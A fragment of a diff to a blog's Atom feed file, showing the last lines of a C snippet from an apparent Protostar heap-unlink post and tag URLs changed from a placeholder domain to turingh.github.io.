class="line">  <span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"dynamite failed?\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]>
     
     </summary>
     
-      <category term="exploit" scheme="http://yoursite.com/tags/exploit/"/>
+      <category term="exploit" scheme="http://turingh.github.io/tags/exploit/"/>
     
-      <category term="free" scheme="http://yoursite.com/tags/free/"/>
+      <category term="free" scheme="http://turingh.github.io/tags/free/"/>
     
-      <category term="heap" scheme="http://yoursite.com/tags/heap/"/>
+      <category term="heap" scheme="http://turingh.github.io/tags/heap/"/>
     
-      <category term="unlink" scheme="http://yoursite.com/tags/unlink/"/>
+      <category term="unlink" scheme="http://turingh.github.io/tags/unlink/"/>
     
-      <category term="protostar" scheme="http://yoursite.com/categories/protostar/"/>
+      <category term="protostar" scheme="http://turingh.github.io/categories/protostar/"/>
     
   </entry>
   
